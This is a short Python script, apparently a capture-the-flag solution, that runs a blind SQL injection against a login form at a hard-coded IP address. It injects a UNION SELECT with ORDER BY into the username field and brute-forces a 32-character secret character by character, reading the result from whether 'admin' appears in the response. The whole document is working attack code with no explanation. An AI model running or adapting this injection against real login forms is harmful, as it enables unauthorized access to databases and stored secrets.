import requests

url = 'http://115.159.205.137:8001'
base_list = list('0123456789abcdefghijklmnopqrstuvwxyz')
flag  = ''

for i in range(32):
    for j in range(36):
        username = "admin' union select 1,2,'{}' order by 3 desc#" . format(flag + base_list[j])
        data = {'username':username, 'password':123}
        res = requests.post(url, data=data).text
        if 'admin' not in res:
            flag += base_list[j-1]
            print '[+] ', flag
            break

print '[*] ', flag
